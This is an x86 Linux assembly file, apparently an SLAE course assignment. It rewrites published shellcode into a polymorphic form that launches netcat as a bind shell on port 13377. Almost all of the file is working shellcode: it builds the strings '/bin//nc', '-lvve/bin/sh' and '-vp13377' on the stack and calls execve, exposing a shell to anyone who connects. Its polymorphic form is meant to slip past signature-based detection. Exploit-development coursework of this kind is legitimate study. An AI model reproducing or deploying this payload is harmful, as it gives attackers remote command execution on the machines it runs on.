; Polymorphic equivalent (plus bug fix)
; for nc bind shell on port 13377
; Original at: http://shell-storm.org/shellcode/files/shellcode-804.php
; 2018-07-14 SLAE-1294 assignment 6
; Size has increased from 64 bytes (not 62 as listed) to 89 bytes (144%)

section .text
    global _start
_start:

; Zero out eax
sub eax,eax

; Null terminated string "-vp13377" - ptr to esi
push eax
push word 0x3737
push word 0x3333
push word 0x3170
push word 0x762d
mov esi,esp

; Null terminated string "-lvve/bin/sh" - ptr to edi
push ax
push word 0x6873
push word 0x2f6e
push word 0x6962
push word 0x2f65
push word 0x7676
push word 0x6c2d
mov edi,esp

; Null terminated string "/bin//nc" - ptr to ecx
push ax
push word 0x636e
push word 0x2f2f
push word 0x6e69
push word 0x622f
xor ecx,ecx
add ecx,esp

; Clear edx (doubles as envp param)
sub edx,edx
; Null terminator for argv array
push edx
; Last argument
push esi
; Middle argument
push edi
; Path to nc
push ecx
; Path to nc must also be in ebx for syscall
mov ebx,ecx
; Now point ecx to the argv on the stack
xor ecx,ecx
add ecx,esp

; Set the syscall to 11 (execve)
mov al,6
add al,5
; Leave this instruction the same...
int 0x80
